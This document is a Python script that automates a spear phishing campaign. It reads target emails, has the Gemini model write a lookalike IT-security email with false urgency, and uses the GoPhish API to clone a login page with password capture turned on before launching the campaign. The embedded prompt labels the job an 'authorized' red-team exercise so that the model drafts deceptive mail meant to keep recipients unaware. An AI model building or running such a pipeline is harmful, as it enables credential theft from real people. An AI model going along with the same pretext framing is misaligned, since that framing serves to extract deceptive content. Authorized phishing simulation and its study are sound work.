
#PHILUM PHISHING : Pilum Phishing - Throwing a thousand spears eventually one will land
#automated spear phishing workflow script, specifically a script that feeds an llm prompted
#with creating the template for the phishing campaign info about the target
#and finally integration of gophish API to clone the target/html victim and
#from file input receives the target emails to phish

#stricly educational i will be testing this on my own emails
#I could have integrated TracerTNG and lazynmap directly and modified their corresponding json reports to be automatically fed here
#but i'm lazy and have little time so i'll just set targets manually via arguments from CLI

#libraries
import argparse
import os
import sys
import requests
import json
import time
import datetime
import urllib3 # x SSL warnings
from urllib.parse import urlparse
from google import genai

class GoPhishAPI:
    def __init__(self,host:str,api_key:str):
        self.host    = host.rstrip("/")      
        self.headers = {
            "Authorization": f"Bearer {api_key}",  
            "Content-Type":  "application/json"
        }
    def get(self,endpoint:str)->any:
        r = requests.get(
            f"{self.host}/api/{endpoint}",
            headers=self.headers,
            verify=False   
        )
        r.raise_for_status()    
        return r.json()
    def post(self,endpoint:str,payload:dict)->dict:
        r = requests.post(
            f"{self.host}/api/{endpoint}",
            headers=self.headers,
            json=payload,      
            verify=False
        )
        r.raise_for_status()
        return r.json()

#Output formatting
try: 
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    C_TITLE=Fore.CYAN+Style.BRIGHT 
    C_OK=Fore.GREEN  
    C_WARN=Fore.YELLOW 
    C_ERR=Fore.RED 
    C_INFO=Fore.BLUE+Style.BRIGHT 
    C_RESET=Style.RESET_ALL 
    C_BOLD=Style.BRIGHT
    C_DIM=Style.DIM 
except ImportError: 
    C_TITLE=C_OK=C_WARN=C_ERR=C_INFO=C_RESET=C_BOLD=C_DIM=""

#BANNER 
def banner():
    print(f"""
{C_TITLE}╔══════════════════════════════════════════════════════╗
║   PhilumPhishing - MIKE DG  -  Kali Linux Edition    ║
║                eventually one will land              ║
╚══════════════════════════════════════════════════════╝{C_RESET}
""")

#urllib3 self-signed cert
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#env api keys
GOPHISH_API_KEY=os.getenv("GOPHISH_API_KEY")
GEMINI_API_KEY=os.getenv("GEMINI_API_KEY")

#smtp profile name
SMTP_PROFILE_NAME="test-smtp-profile"

#default values x args
DEFAULT_GOPHISH_HOST="https://localhost:3333" #gophish default but i can change it later
DEFAULT_LISTENER_URL="https://192.168.20.101" #my VM's ip
DEFAULT_CAMPAIGN_NAME="PhilumPhishing-campaign"

#cli args
def parse_arguments():
    parser=argparse.ArgumentParser(
        description=(
        f"{banner}",
        f"{C_DIM}EDUCATIONAL USE ONLY{C_RESET}"
        )
    )
    parser.add_argument(
        "-t","--targets",
        required=True,
        metavar="FILE",
        help="Path to targets.txt (1 email per line)"
    ) 
    parser.add_argument(
        "-u","--url",
        required=True,
        metavar="URL",
        help="URL of the login page to clone"
    )
    parser.add_argument(
        "-gh","--gophish-host",
        default=DEFAULT_GOPHISH_HOST,
        metavar="URL",
        help=f"Gophish API URL (default: {DEFAULT_GOPHISH_HOST})"
    )
    parser.add_argument(
        "-l","--listener",
        default=DEFAULT_LISTENER_URL,
        metavar="URL",
        help=f"Gophish listener URL (default: {DEFAULT_LISTENER_URL})"
    )
    parser.add_argument(
        "-c","--campaign-name",
        default=DEFAULT_CAMPAIGN_NAME,
        metavar="name",
        help=f"Gophish listener URL (default: {DEFAULT_CAMPAIGN_NAME})"
    )
    return parser.parse_args()

#load targets
def load_targs(filepath:str)->list[dict]: #from str in the file i'll output a list with the target info for the template
    targets=[]
    print(f"{C_WARN}Loading targets from filepath...{C_RESET} ({filepath})")
    with open(filepath,"r",encoding="utf-8") as f:
        for line_num,raw_line in enumerate(f, start=1):
            line=raw_line.strip()
            if not line or line.startswith("#"): #ignore comments and empty lines
                continue
            if "," in line:
                parts      = line.split(",", maxsplit=1)
                full_name  = parts[0].strip()
                email      = parts[1].strip()
                name_parts = full_name.split(" ", maxsplit=1)
                first_name = name_parts[0].capitalize()
                last_name  = name_parts[1].capitalize() if len(name_parts) > 1 else ""
            else:
                email=line
                local_part=email.split("@")[0] #from the email i try to extrapolate the name by a simple split before the @
                name=local_part.replace("."," ").replace("_"," ").split() #michael.dg@yahoo | michael_dg@yahoo -> michael dg
                first_name=name[0].capitalize() if name else "User"
                last_name=name[1].capitalize() if len(name) > 1 else ""
            if "@" not in email or "." not in email.split("@")[-1]:
                print(f"{C_ERR}invalid email, skipping{C_RESET}")
                continue
            targets.append({"first_name":first_name,"last_name":last_name,"email":email})
            print(f"{C_WARN}Loaded target:{C_RESET} {C_DIM}{first_name} {last_name} > {email}{C_RESET}")
        if not targets:
            print(f"{C_ERR}invalid targets, exiting{C_RESET}")
            sys.exit(1)
        print(f"{C_WARN}Total targets loaded:{C_RESET} {C_DIM}{len(targets)}{C_RESET}\n")
        return targets
    
#genai template
def genai_phishing_template(target_url: str,targets:list[dict],api_key:str)->dict:
    client=genai.Client(api_key=api_key)
    parsed=urlparse(target_url) #extracting domain from target
    domain=parsed.netloc or parsed.path.split("/")[0]
    path_hint=parsed.path or "/" # https://company.org/login -> company.org

    sample_names=[
        f"{t["first_name"]} {t["last_name"]}".strip()
        for t in targets[:3]
    ]
    name_str=", ".join(sample_names) if sample_names else "the user"
    
    #prompt
    prompt=f"""
    You are a professional pentester creating a SIMULATED AND AUTHORIZED phishing email for a red team exercise.

    Context:
    1. The target organization's portal domain: {domain}
    2. The cloned login page: {path_hint}
    3. Sample target names: {name_str}

    Your task:
    1. Appear to come from an automatized IT/Security team reply at the organization at "{domain}"
    2. Create a mild urgency (ex. require a password reset, a login, a verification, an unusual sign in from a weird location...)
    3. Include a clear call to action button or link to fullfill the urgent request
    4. Uses the placeholder {{{{.URL}}}} wherever the phishing link should go
    5. Uses {{{{.FirstName}}}} as placeholder for the recipient's name
    6. Is professionally written and formal
    7. Has a realistic email footer (company name derived from domain, support email, uses deceptive letters to create a lookalike etc...)

    IMPORTANT RULES FOR FORMATTING
    - Return ONLY a valid JSON object, no markdown, no backticks, no explanation
    - JSON MUST have EXACTLY two keys: "subject" and "html_body"
    - "subject" is a string (email subject line)
    - "html_body" is a complete HTML document string for the email body
    - use inline CSS for email client compatibility
    - do NOT include ANY meta-commentary or warnings in the output they must be UNAWARE Of the test

    JSON format:
    {{
    "subject":"..."
    "html_body":"..."
    }}
    """
    print(f"{C_WARN}[DEBUG] sending prompt to gemini...{C_RESET} {C_DIM}Domain: {domain} Target Samples: {name_str}{C_RESET}\n")
    response=client.models.generate_content(model="gemini-2.5-flash",contents=prompt)
    raw_text=response.text.strip()
    if raw_text.startswith("```"): #markdown fences if there's any even after prompt
        lines=raw_text.split("\n")
        raw_text="\n".join(lines[1:-1]).strip()
    try:
        template_data=json.loads(raw_text)
        assert "subject" in template_data, "Missing 'subject' key in gemini response"
        assert "html_body" in template_data, "Missing 'html_body' key in gemini response"
        print(f"{C_WARN}[DEBUG] Template generated...{C_RESET} {C_DIM}Subject: {template_data['subject']}{C_RESET}\n")
        return template_data
    except (json.JSONDecodeError,AssertionError) as e: #covering for errors in encoding 
        print(f"{C_ERR}Failed to parse gemini response as json:{C_RESET} {C_DIM}{e}{C_RESET}")
        sys.exit(1)

#gophish api
def init_client(host:str,api_key:str)->GoPhishAPI:
    print(f"{C_WARN}Connecting to GoPhish at {host}...{C_RESET}")
    client = GoPhishAPI(host, api_key)
    try:
        campaigns = client.get("campaigns/")
        print(f"{C_OK}Connected. Existing campaigns:{len(campaigns)}\n{C_RESET}")
    except Exception as e:
        print(f"{C_ERR}Could not reach GoPhish API: {e}{C_RESET}")
        sys.exit(1)
    return client

def create_group(client: GoPhishAPI, targets: list[dict], group_name: str) -> dict:
    print(f"{C_WARN}Creating target group: {group_name}{C_RESET}")
    payload = {
        "name": group_name,
        "targets": [
            {
                "first_name": t["first_name"],
                "last_name":  t["last_name"],
                "email":      t["email"],
                "position":   "Employee"
            }
            for t in targets
        ]
    }
    result = client.post("groups/", payload)
    print(f"{C_OK}[+] Group created. ID: {result['id']}\n{C_RESET}")
    return result
 
def create_template(client: GoPhishAPI, template_data: dict, template_name: str) -> dict:
    print(f"{C_WARN}Creating email template: {template_name}{C_RESET}")
    html_with_tracker = template_data["html_body"] + "\n{{.Tracker}}"
    payload = {
        "name":    template_name,
        "subject": template_data["subject"],
        "html":    html_with_tracker,
        "text":    ""
    }
    result = client.post("templates/", payload)
    print(f"{C_OK}Template created. ID: {result['id']}\n{C_RESET}")
    return result


def create_landing_page(client: GoPhishAPI, clone_url: str, page_name: str, redirect_url: str) -> dict:
    print(f"{C_WARN}Cloning landing page from: {clone_url}{C_RESET}")
    try:
        imported   = client.post("import/site", {"url": clone_url, "include_resources": False})
        cloned_html = imported["html"]
        print(f"{C_OK}Page cloned ({len(cloned_html)} chars){C_RESET}")
    except Exception as e:
        print(f"{C_ERR}Clone failed: {e} — using fallback form{C_RESET}")
        cloned_html = """<html><body>
<h2>Login</h2>
<form method="POST">
  <input type="text" name="username" placeholder="Username"><br>
  <input type="password" name="password" placeholder="Password"><br>
  <button type="submit">Login</button>
</form></body></html>"""
 
    payload = {
        "name":                page_name,
        "html":                cloned_html,
        "capture_credentials": True,
        "capture_passwords":   True,
        "redirect_url":        redirect_url
    }
    result = client.post("pages/", payload)
    print(f"{C_OK}Landing page created. ID: {result['id']}\n{C_RESET}")
    return result
 
 
def get_or_create_smtp(client: GoPhishAPI, profile_name: str) -> dict:
    print(f"{C_WARN}Looking up SMTP profile: {profile_name}{C_RESET}")
    profiles = client.get("smtp/")
    for p in profiles:
        if p["name"].lower() == profile_name.lower():
            print(f"{C_OK}Found existing profile. ID: {p['id']}\n{C_RESET}")
            return p
 
    print(f"{C_DIM}Not found — creating MailHog stub{C_RESET}")
    payload = {
        "name":              profile_name,
        "host":              "localhost:1025",   # MailHog SMTP port
        "from_address":      "IT Security <it-security@corp-lab.local>",
        "username":          "",
        "password":          "",
        "ignore_cert_errors": True
    }
    result = client.post("smtp/", payload)
    print(f"{C_OK}SMTP profile created. ID: {result['id']}\n{C_RESET}")
    return result
 
 
def create_campaign(
    client:        GoPhishAPI,
    campaign_name: str,
    template:      dict,
    landing_page:  dict,
    smtp_profile:  dict,
    target_group:  dict,
    phish_url:     str
) -> dict:
    print(f"{C_WARN}Creating campaign: {campaign_name}{C_RESET}")
    payload = {
        "name":     campaign_name,
        "url":      phish_url,
        "template": {"name": template["name"]},
        "page":     {"name": landing_page["name"]},
        "smtp":     {"name": smtp_profile["name"]},
        "groups":   [{"name": target_group["name"]}]
    }
    result = client.post("campaigns/", payload)
    print(f"{C_OK}Campaign launched! ID: {result['id']} Status: {result['status']}\n{C_RESET}")
    return result
 
 
def print_summary(client: GoPhishAPI, campaign: dict) -> None:
    result = client.get(f"campaigns/{campaign['id']}/")
    print(f"\n{C_BOLD}{'='*60}{C_RESET}")
    print(f"{C_BOLD}  {result['name']}{C_RESET}")
    print(f"{C_BOLD}{'='*60}{C_RESET}")
    print(f"{C_DIM}  ID:     {result['id']}")
    print(f"  Status: {result['status']}{C_RESET}")
 
    if result.get("results"):
        print(f"\n{C_INFO}  Targets:{C_RESET}")
        for r in result["results"]:
            print(f"    [{r['status']:20s}] {r['first_name']} {r['last_name']} <{r['email']}>")
 
    print(f"\n{C_DIM}  Full results on dashboard")
    print(f"{'='*60}{C_RESET}\n")
 
def main():
    banner()
    args = parse_arguments()
 
    targets_file  = args.targets
    clone_url     = args.url
    campaign_name = args.campaign_name
    listener_url  = args.listener
    gophish_host  = args.gophish_host
 
    print(f"{C_INFO}[CONFIG]{C_RESET}")
    print(f"{C_DIM}  Targets:       {targets_file}")
    print(f"  Clone URL:     {clone_url}")
    print(f"  Campaign:      {campaign_name}")
    print(f"  GoPhish host:  {gophish_host}")
    print(f"  Listener:      {listener_url}{C_RESET}\n")
 
    if not GOPHISH_API_KEY:
        print(f"{C_ERR}[GOPHISH_API_KEY not set. Run: export GOPHISH_API_KEY=your-key{C_RESET}")
        sys.exit(1)
    if not GEMINI_API_KEY:
        print(f"{C_ERR}GEMINI_API_KEY not set. Run: export GEMINI_API_KEY=your-key{C_RESET}")
        sys.exit(1)
 
    # unique suffix so re-runs don't collide on resource names
    stamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
 
    targets       = load_targs(targets_file)
    template_data = genai_phishing_template(clone_url, targets, GEMINI_API_KEY)
    client        = init_client(gophish_host, GOPHISH_API_KEY)
 
    group         = create_group(client, targets,       f"Group-{campaign_name}-{stamp}")
    template      = create_template(client, template_data, f"Template-{campaign_name}-{stamp}")
    landing_page  = create_landing_page(client, clone_url,  f"Page-{campaign_name}-{stamp}", clone_url)
    smtp_profile  = get_or_create_smtp(client, SMTP_PROFILE_NAME)
    campaign      = create_campaign(client, campaign_name, template, landing_page, smtp_profile, group, listener_url)
 
    time.sleep(2)
    print_summary(client, campaign)
    print(f"{C_OK}[Done. Monitor on dahsboard{C_RESET}\n")
 
 
if __name__ == "__main__":
    main()



    